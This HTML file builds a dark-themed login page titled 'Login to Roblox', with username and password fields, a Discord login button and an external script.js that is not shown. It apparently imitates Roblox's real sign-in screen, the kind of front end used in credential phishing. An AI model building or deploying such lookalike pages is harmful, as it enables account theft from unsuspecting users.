<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        :root { --bg-color: #191B1D; --container-bg: #232527; --text-main: #FFFFFF; --text-secondary: #B8B8B8; --input-bg: #393B3D; --input-border: #111214; --btn-primary: #00B2FF; --btn-hover: #0084BD; --discord-color: #5865F2; }
        body { font-family: sans-serif; background-color: var(--bg-color); color: var(--text-main); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: var(--container-bg); padding: 40px 30px; border-radius: 8px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid var(--input-border); background-color: var(--input-bg); color: white; margin-bottom: 15px; box-sizing: border-box; }
        .btn-login { width: 100%; padding: 12px; background-color: var(--btn-primary); border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; }
        .divider { margin: 25px 0; color: var(--text-secondary); font-size: 12px; display: flex; align-items: center; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #454749; margin: 0 10px; }
        .btn-discord { width: 100%; padding: 12px; background-color: var(--discord-color); border: none; border-radius: 4px; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
    </style>
</head>
<body>
<div class="login-container">
    <h1>Login to Roblox</h1>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Username/Email/Phone" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" class="btn-login">Log In</button>
    </form>
    <div class="divider">OR</div>
    <button class="btn-discord" id="discordLogin">Login with Discord</button>
</div>
<script src="script.js"></script>
</body>
</html>
